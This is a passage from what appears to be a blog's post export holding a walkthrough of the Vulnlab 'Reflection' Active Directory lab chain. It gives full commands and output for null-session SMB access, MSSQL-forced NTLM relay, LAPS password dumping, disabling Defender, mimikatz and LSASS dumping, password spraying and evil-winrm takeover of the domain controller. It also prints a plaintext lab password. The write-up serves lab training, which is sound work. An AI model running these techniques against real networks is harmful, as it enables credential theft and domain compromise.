CIFS on the DC. That did not seem to work, so I decided to pivot elsewhere. There are also no credentials or applications that we could exploit on this machine, so the exploit has to be externally through AD ACLs.\n\nNow when I had figured out what to do, it seemed incredibly simple in hindsight. This is a tactic that is always worth a try to give if you have credentials, which is the idea of password reusage. Spraying passwords that you currently own to other users is never a bad idea unless you're in an environment that restricts brute-forcing. In our case, that does not seem to be an issue.\n\nI pulled all of the users from Bloodhound and placed them into a wordlist, you can do so just simply by creating a text file and reading from all of the domain user nodes.\n\n```\n└─$ cat ul.txt    \ndom_rgarner\nsvc_web_prod\nsvc_web_staging\ndeborah.collins\njeremy_marshall\nrhys.garner\ndylan.marsh\ndorothy.rose\ncraig.williams\nbethany.wright\nabbie.smith\nmichael.wilkinson\nlabadm\ngeorgia.price\n```\n\nNow that we have this user list, let's see if `georgia.price` shares a password with any of these users. We can do so with `crackmapexec`.\n\n```\n└─$ crackmapexec smb 10.10.255.149 -u ul.txt -p '[...snip...]'   \nSMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)\nSMB         10.10.255.149   445    DC01             [+] reflection.vl\\dom_rgarner:[...snip...] (Pwn3d!)\n```\n\nWe can see that a successful authentication attempt came back for `dom_rgarner`. I verified that the user `dom_rgarner` is a domain admin and also has access to WinRM on the DC. You can view this in Bloodhound on the user's node.\n\nSo given that we have access to a domain admin, we can now take hold of the DC and authenticate to it to complete this chain. \n\n```\n└─$ evil-winrm --ip 10.10.255.149 -u 'dom_rgarner' -p '[...snip...]'\n \nEvil-WinRM shell v3.5\n   \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents> cat C:\\Users\\Administrator\\Desktop\\flag.txt\n[...snip...]\n*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents> hostname\ndc01\n```\n\nAs seen above, we are able to read the last flag within the Administrator home directory. This means that we have successfully compromised this chain!\n\n![](/images/vulnlab/reflection-vl/i.png)\n\n# Conclusion\n\nThis chain was very fun, and it definitely was a hard-hitter for Windows pivoting and privilege escalation. Learning how to do NTLM relay was very different, and I believe that it definitely helped with strengthening some skills. Big thanks to xct and r0BIT for developing this chain, it was great!\n\n# Resources\n\nhttps://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/BloodHoundAD/BloodHound\nhttps://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\nhttps://github.com/BishopFox/sliver\nhttps://github.com/ParrotSec/mimikatz\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nhttps://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\nhttps://dan-feliciano.com/2024/06/05/tengu/\nhttps://github.com/GhostPack/Seatbelt\n\n","slug":"reflection","published":1,"updated":"2024-06-23T00:45:10.840Z","_id":"clxqttnri0000g5uf68he69yj","comments":1,"layout":"post","photos":[],"content":"<p>Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn’t seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Our three machines are <code>10.10.255.149-151</code>. We’ll query each of these with the NMAP scans that we usually run.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.255.149 &amp;&amp; sudo nmap 10.10.255.150 &amp;&amp; sudo nmap 10.10.255.151</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.255.149</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.255.150</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:19 EDT</span><br><span class=\"line\">Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 0.65% done</span><br><span class=\"line\">Nmap scan report for 10.10.255.151</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this environment is solely Windows Active Directory, with no domain-joined Linux machines available. We have a domain controller running on <code>.53</code> given that both Kerberos and the DNS services are running on that machine. We then have two workstations on <code>.150</code> and <code>.151</code>, from which <code>.150</code> seems to be a workstation with an external facing MSSQL service (which is already a vulnerability).</p>\n<p>Note that if you wanted to view the domain names for each of the machines, I learned that you don’t have to use NMAP scripts to do so. You can simply use <code>crackmapexec</code> to query SMB on all of the workstations, as all of them contain this service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.255.149-167</span><br><span class=\"line\">SMB         10.10.255.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>Given that both <code>MS01</code> and <code>WS01</code> have SMB and RDP running, my first guess is for us to attempt to interact with these services for any null authentication. We’ll give those a go starting with SMB with the below commands.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.255.(150 or 151) -N</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ smbclient -L 10.10.255.150 -N</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">staging         Disk      staging environment</span><br></pre></td></tr></table></figure>\n\n<p>It seems that on <code>MS01</code> (the workstation running MSSQL) allows us to list shares with null authentication. Furthermore, the share <code>staging</code> seems to be an uncommon name for a share so we’ll query this to see if there’s anything we can find.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.255.150\\\\staging -N</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jun  7 13:42:48 2023</span><br><span class=\"line\">  ..                                  D        0  Wed Jun  7 13:41:25 2023</span><br><span class=\"line\">  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023</span><br><span class=\"line\"></span><br><span class=\"line\">                6261245 blocks of size 4096. 1166816 blocks available</span><br><span class=\"line\">smb: \\&gt; get staging_db.conf</span><br><span class=\"line\">getting file \\staging_db.conf of size 50 as staging_db.conf (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class=\"line\">smb: \\&gt; exit</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MSSQL-Enumeration-on-MS01\"><a href=\"#MSSQL-Enumeration-on-MS01\" class=\"headerlink\" title=\"MSSQL Enumeration on MS01\"></a>MSSQL Enumeration on MS01</h1><p>We have access to the <code>staging_db.conf</code> being the only file in this share, so we’ll pull it to our localhost to see if it has any important information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat staging_db.conf </span><br><span class=\"line\">user=web_staging</span><br><span class=\"line\">password=Washroom510</span><br><span class=\"line\">db=staging</span><br></pre></td></tr></table></figure>\n\n<p>The configuration file seems to have credentials for us for the <code>web_staging</code> user. I ran a few of these through crackmapexec to see if they’re valid credentials to the domain controller, however it does not seem that we can use it to query the DC.</p>\n<p>I gave a few of the services that are local to <code>MS01</code> a try such as SMB or RDP, however our credentials don’t seem to work to those services. Let’s look at the MSSQL service specifically, I had the initial thought that these credentials went there however I wanted to test for password reusage in the other areas of the environment before moving on.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_staging  dbo@staging)&gt; select * from users;</span><br><span class=\"line\">id   username   password        </span><br><span class=\"line\">--   --------   -------------   </span><br><span class=\"line\"> 1   b&#x27;dev01&#x27;   b&#x27;Initial123&#x27;   </span><br><span class=\"line\"></span><br><span class=\"line\"> 2   b&#x27;dev02&#x27;   b&#x27;Initial123&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>It seems like we have credentials from for two users, <code>dev01</code> and <code>dev02</code>. Unfortunately, I ran a few tests against CME as these users and it seems that there isn’t much that we can access from these users.</p>\n<h1 id=\"NTLM-Relay-to-DC01\"><a href=\"#NTLM-Relay-to-DC01\" class=\"headerlink\" title=\"NTLM Relay to DC01\"></a>NTLM Relay to DC01</h1><p>This lead me down to a new type of attack that we can exploit that follows a similar title to the name of the box. When I think of the word “Reflection”, the first type of attack with a similar connotation that comes to mind is relaying. There are various types of relaying attacks such as SMB, SMTP, or NTLM relay, so we’ll need to understand what we’re dealing with in order to determine the type of relay attack.</p>\n<p>Essentially our goal is to relay another user’s credentials that we do NOT know. At a low-level, this is essentially what relaying will do for us; relay a user’s authentication from one service on one machine to another service (potentially on another). I want to stress that this exploit is helpful when you’re able to trigger authentication attempts and relay them from an account that you do NOT own to another service.</p>\n<p>Our current situation may not seem to have those prerequisites, since we aren’t aware of any other users and their respective passwords. While we initially think that we only have access to three users currently, we actually have access to one more.</p>\n<p>The way I interpreted this may be incorrect and someone can feel free to correct on this if need be, however the fourth account that we can force an authentication attempt against is actually right in MSSQL. You see, when you execute a command in MSSQL or when you execute a query, it’s the service account that actually queries that information for you. While we don’t know the specific username to the service account (which can vary from box to box), we can force it to authenticate to a machine that we own.</p>\n<p>This can be done by utilizing the <code>xp_dirtree</code> MSSQL command built into Impacket, which essentially allows us to query a folder on the local host. This can also however, be used to query folders on remote hosts. This means we can point the directory listing command back to our local Kali machine. Our goal is to relay the authentication, however I just want to show the proof-of-concept of what I mean before we continue.</p>\n<p>We can boot up <code>responder</code> on a separate terminal pane with <code>sudo responder -I (VPN interface)</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/b.png\"></p>\n<p>As you can from the above, a successful hash was captured for <code>svc_web_staging</code>. While we probably can’t crack the hash for this account, this does prove that we have the ability to relay the credentials.</p>\n<p>To do this, we can use a tool from Impacket called <a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\">ntlmrelayx</a>. This tool will relay the NTLM hash that we can see much like in Responder and use that NTLM hash to authenticate to another service. We can relay the credentials to any service on a target machine, should that service allow for NTLM authentication and allows <code>svc_web_staging</code> to authenticate to it. Let’s try SMB, though you could also point it to the MSSQL service on the DC if you’d like.</p>\n<p>We can start <code>ntlmrelayx</code> with the below command, ensuring that we specify the <code>-i</code> option for an interactive session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-ntlmrelayx -t smb://10.10.255.149 -smb2support -i</span><br></pre></td></tr></table></figure>\n\n<p>This should launch about over 10 protocols that will listen for incoming requests, much like Responder did. All that’s left now is to query our localhost on the MSSQL workstation and forward the request to SMB.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/c.png\"></p>\n<p>As you can see, an SMB client shell was started on our local machine on port 11000. We can connect to this easily using netcat. Be sure that you do NOT close out of <code>ntlmrelayx</code> until we’ve finished using the local shell.</p>\n<h1 id=\"SMB-MSSQL-Enumeration-on-DC01\"><a href=\"#SMB-MSSQL-Enumeration-on-DC01\" class=\"headerlink\" title=\"SMB&#x2F;MSSQL Enumeration on DC01\"></a>SMB&#x2F;MSSQL Enumeration on DC01</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc 127.0.0.1 11000</span><br><span class=\"line\">Type help for list of commands</span><br><span class=\"line\"># help</span><br><span class=\"line\"></span><br><span class=\"line\"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have a semi-interactive SMB shell, which has successfully connected to the DC through NTLM relay. We can now enumerate the SMB shares in the context of <code>svc_web_staging</code>. You can enumerate shares with the <code>shares</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># shares</span><br><span class=\"line\">ADMIN$</span><br><span class=\"line\">C$</span><br><span class=\"line\">IPC$</span><br><span class=\"line\">NETLOGON</span><br><span class=\"line\">prod</span><br><span class=\"line\">SYSVOL</span><br><span class=\"line\"># use prod</span><br><span class=\"line\"># ls</span><br><span class=\"line\">drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .</span><br><span class=\"line\">drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..</span><br><span class=\"line\">-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, there is a <code>prod_db.conf</code> file within the <code>prod</code> share, we’ll grab this to see if there’s anything we can find within it. You can do so with a simple <code>get</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat prod_db.conf</span><br><span class=\"line\">user=web_prod</span><br><span class=\"line\">password=[...snip...]</span><br><span class=\"line\">db=prod</span><br></pre></td></tr></table></figure>\n\n<p>This file contains the password for <code>web_prod</code>, who I would assume much like <code>web_staging</code> is able to authenticate regularly to the MSSQL service on the DC. While you can’t verify this with <code>crackmapexec</code> as this requires your request to go to LDAP (which is currently blocking logins from untrusted domains).</p>\n<p>However if we attempt to log-in with Impacket, we can see that the request travels through as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-mssqlclient reflection.vl/&#x27;web_prod&#x27;:&#x27;[...snip...]&#x27;@10.10.255.149                     </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Encryption required, switching to TLS</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class=\"line\">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class=\"line\">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class=\"line\">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">SQL (web_prod  guest@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Let’s enumerate a little further into a few of the tables, I noticed immediately that there was a different table in this MSSQL service titled <code>prod</code>, so we’ll look into that. </p>\n<p>Note that if you relayed your <code>svc_web_staging</code> NTLM credentials to MSSQL when we were performing NTLM relay earlier, you would NOT have access to this database. This is because only <code>web_prod</code> is able to query it, meaning you would have to relay to SMB anyways. You’d be able to verify that the <code>prod_db.conf</code> file exists since you can query the local filesystem with <code>xp_dirtree</code> and you would notice that you can view the SMB shares from the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_prod  guest@master)&gt; use prod</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to &#x27;prod&#x27;.</span><br><span class=\"line\">SQL (web_prod  dbo@prod)&gt; select table_name from information_schema.tables</span><br><span class=\"line\">table_name   </span><br><span class=\"line\">----------   </span><br><span class=\"line\">users</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, there is a similar <code>users</code> table within this database, so let’s query it to see if there are any other credentials we can receive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_prod  dbo@prod)&gt; select * from users</span><br><span class=\"line\">id   name              password            </span><br><span class=\"line\">--   ---------------   -----------------   </span><br><span class=\"line\"> 1   b&#x27;abbie.smith&#x27;    b&#x27;[...snip...]&#x27;   </span><br><span class=\"line\"></span><br><span class=\"line\"> 2   b&#x27;dorothy.rose&#x27;   b&#x27;[...snip...]&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the credentials to both <code>abbie.smith</code> and <code>dorothy.rose</code>, both being domain users within the AD instance of this chain. At this point - we should be fine to close out of NTLM relay for now as we won’t need it anymore.</p>\n<h1 id=\"Domain-Enumeration-with-Bloodhound\"><a href=\"#Domain-Enumeration-with-Bloodhound\" class=\"headerlink\" title=\"Domain Enumeration with Bloodhound\"></a>Domain Enumeration with Bloodhound</h1><p>While we weren’t able to query LDAP earlier since we were using accounts that cause the untrusted domain rule to execute, we now have proper domain user credentials meaning we can query LDAP as we normally would. Let’s dump the domain with these credentials using the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound Python ingestor</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;reflection.vl&#x27; -u &#x27;abbie.smith&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 10.10.255.149 --zip</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all of the domain objects dumped to a compressed archive, we can load these into <a href=\"https://github.com/BloodHoundAD/BloodHound\">Bloodhound</a>.</p>\n<p>After uploading them to the Bloodhound database, let’s take a look at some of the users that we can potentially exploit to get onto one of the workstations. Note that although you have credentials to <code>abbie.smith</code> and <code>dorothy.rose</code>, they do NOT have access to WinRM or RDP or either of the <code>WS01</code> or <code>MS01</code> workstations.</p>\n<p>When looking around at the accounts that we currently have control over, I noticed that one of the users, <code>abbie.smith</code>, has a notable outbound object control. </p>\n<p><img src=\"/images/vulnlab/reflection-vl/d.png\"></p>\n<p>It seems that <code>abbie.smith</code> has <code>GenericAll</code> over the <code>MS01</code> workstation. This specific object control is otherwise known as full control, meaning the <code>MS01</code> workstation allows <code>abbie.smith</code> to manipulate it however it may wish. Normally if we had <code>GenericAll</code> over a domain user, we would just be able to change the domain user’s password with <code>bloodyAD</code>. That being said, we have this privilege over the machine itself instead of a specific user.</p>\n<p>There are a few things that we can try, notably resource-based constrained delegation (RBCD) or local administrator password solution (LAPS) exploitation. The only issue with RBCD is that we do not have control of a machine that has an SPN set to do this. We also can’t add a computer due to both <code>abbie.smith</code> and <code>dorothy.rose</code> having a MachineAccountQuota (MAQ) value of 0. We would need a MAQ value of either 1 or above to be able to do this.</p>\n<h1 id=\"Reading-LAPS-Password-for-MS01\"><a href=\"#Reading-LAPS-Password-for-MS01\" class=\"headerlink\" title=\"Reading LAPS Password for MS01\"></a>Reading LAPS Password for MS01</h1><p>Thus, let’s try exploiting <a href=\"https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\">LAPS</a>. This specific service is a Windows feature within most Active Directory environments and Microsoft Entra environments. It essentially backs up the password of the local administrator account of the machine it is enabled on and acts like a cache that stores the respective administrator password. Due to us having <code>GenericAll</code> over the machine account, we can read the LAPS password of the Administrator account on this workstation.</p>\n<p>Easily enough <code>crackmapexec</code> has a built-in module to do this, which will dump the LAPS password of the <code>MS01</code> machine. We’ll need to point our request to LDAP on the DC first before specifically reading the LAPS password of the Administrator on <code>MS01</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.255.149 -u &#x27;abbie.smith&#x27; -p &#x27;[...snip...]&#x27; --kdcHost 10.10.255.150 -M laps</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.255.149   389    DC01             [+] reflection.vl\\abbie.smith:[...snip...]</span><br><span class=\"line\">LAPS        10.10.255.149   389    DC01             [*] Getting LAPS Passwords</span><br><span class=\"line\">LAPS        10.10.255.149   389    DC01             Computer: MS01$                Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the password was dumped successfully. Note that this exploit would only work if LAPS was actually running on the target and we had the respective privilege to be able to dump it.</p>\n<p>Now that we have the password for that user, we should be able to log in as them. Although testing your credentials <code>crackmapexec</code> onto services such as WinRM or RDP on this workstation would come back negative, you can still log in as you normally would through either of those services. Let’s use them to log in to WinRM using <code>evil-winrm</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.255.150 -u &#x27;Administrator&#x27; -p &#x27;[...snip...]&#x27; </span><br><span class=\"line\">    </span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"></span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat C:\\Users\\Administrator\\Desktop\\flag.txt</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have control over the <code>MS01</code> workstation, we can read the first flag as seen above.</p>\n<h1 id=\"Pivoting-to-WS01\"><a href=\"#Pivoting-to-WS01\" class=\"headerlink\" title=\"Pivoting to WS01\"></a>Pivoting to WS01</h1><p>Let’s now turn our attention to the next part of the chain, as we’ll need to escalate to the other workstations on the environment. Given the rule of thumb with these chains, I’m assuming that we’ll need to compromise <code>WS01</code> first before the DC.</p>\n<p>We’ll take a look at Bloodhound again to see if there are any domain user objects that we can use pivot to <code>WS01</code>. I first searched through the <code>domain users</code> group and selected all of the <code>Direct Members</code> to view every user account on the domain. </p>\n<p>I immediately saw something different here with another user on the domain, that user being <code>Georgia.Price</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/e.png\"></p>\n<p>As you can see from the screenshot above, it seems as though <code>Georgia.Price</code> has the same <code>GenericAll</code> permissions that <code>abbie.smith</code> had, this time being on <code>WS01</code>. This means with <code>Georgia.Price</code>‘s credentials, we should be able to either read the LAPS password or exploit RBCD on <code>WS01</code>. The only stipulate here is that we do not current possess those credentials.</p>\n<h1 id=\"Credential-Hunting-on-MS01\"><a href=\"#Credential-Hunting-on-MS01\" class=\"headerlink\" title=\"Credential Hunting on MS01\"></a>Credential Hunting on MS01</h1><p>Now that we have the ability to enumerate <code>MS01</code>, we can do a bit of credential hunting to see if we can find the password for <code>Georgia.Price</code>. I stood up a <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server so we can easily transfer files without needing to curl our binaries to the respective machines we control.</p>\n<p>We’ll need to disable AV first before getting our implant onto <code>MS01</code>, we have the ability to do that given that we are the Administrator on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Set-MpPreference -DisableRealTimeMonitoring $true</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/reflection-vl/f.png\"></p>\n<p>There are a few things that we can do to try and hunt for this password, I’ll show three methods that I tried initially before showing the solution. While these first two solutions are not the answer for retrieving the credentials for <code>Georgia.Price</code>, they are helpful to try in other scenarios.</p>\n<p>Firstly what comes to mind, since we have access to the local Administrator account on <code>MS01</code>, we can dump all of the cached credentials in memory. We’ll do so by dropping <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a> to the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">mimikatz(commandline) # exit</span><br></pre></td></tr></table></figure>\n\n<p>This should dump all of the cached credentials, though none of them seem to be of use. If <code>Georgia.Price</code> did have a cached credential, it would be here. We do see <code>svc_web_staging</code>‘s plaintext password, however this doesn’t seem to be of help to us.</p>\n<p>Next thing we could try is retrieving the LSASS from this machine and reading the machine secrets to see if there are any passwords stored here. You might think that we just did that with Mimikatz above, however doing this can also dump the master keys and GUIDs for any cached DPAPI credentials stored on the machine.</p>\n<p>First, you’ll need to dump the LSASS on the remote machine. While you can do it straight from Sliver, this is incredibly loud and also the potential to crash your session since AV can still track this large handle even though we’ve disabled it in our current process. There are alternatives to this, notably using <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\">procdump</a> which is not picked up by AV as a malicious executable. The great thing about using <code>procdump</code> is that I found the executable for it within <code>C:\\Tools</code>, meaning we don’t need to transfer it from our Kali machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Tools&gt; .\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Tools&gt; mv lsass.dmp C:\\Users\\Administrator\\Documents</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the LSASS dumped to a file, we’ll put it to our Kali machine through Sliver and read it with <code>pypykatz</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz lsa minidump lsass.dmp</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid d0486e64-ff99-4f38-8962-56d7767effbd</span><br><span class=\"line\">masterkey ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0</span><br><span class=\"line\">sha1_masterkey 21a9c244e05002762c3b3f51845a58677a921e2e</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid e233b32e-4d94-4f33-8404-b89d08003375</span><br><span class=\"line\">masterkey 73694a6e64f4ff7947bdad1cc3fe941df4deb26b33060405eab4ce3225db174bd6e0045c1dd2d7b50403f60fc9ce01b908f1925c937f77be3fa85e24db2c6d68</span><br><span class=\"line\">sha1_masterkey 10134d260068b772beec3f5c7e8a6828b68d2023</span><br><span class=\"line\">== DPAPI [3e7]==</span><br><span class=\"line\">luid 999</span><br><span class=\"line\">key_guid ea60aa58-d914-4cb4-a993-ca09a343fc78</span><br><span class=\"line\">masterkey a91c09519bbf0b28ca662f8c0b8f680b5902f9e99438df44d6e2563ca5156259ece153cc041dce1dca518f633d299adb530d37686218a5d84e409a600468b20d</span><br><span class=\"line\">sha1_masterkey b4ac52b7d91b71f7010a9aed39e35ea92e8391b0</span><br></pre></td></tr></table></figure>\n\n<p>We’ll take note of these DPAPI credential master keys for now.</p>\n<p>Lastly, you can also try enumerating scheduled tasks. We can do so by dumping all tasks and their attributes using <code>schtasks</code> in our WinRM session. I learned to do during my time doing <a href=\"https://dan-feliciano.com/2024/06/05/tengu/\">Tengu</a>, which is also a great machine to try for practice.</p>\n<figure class=\"highlight 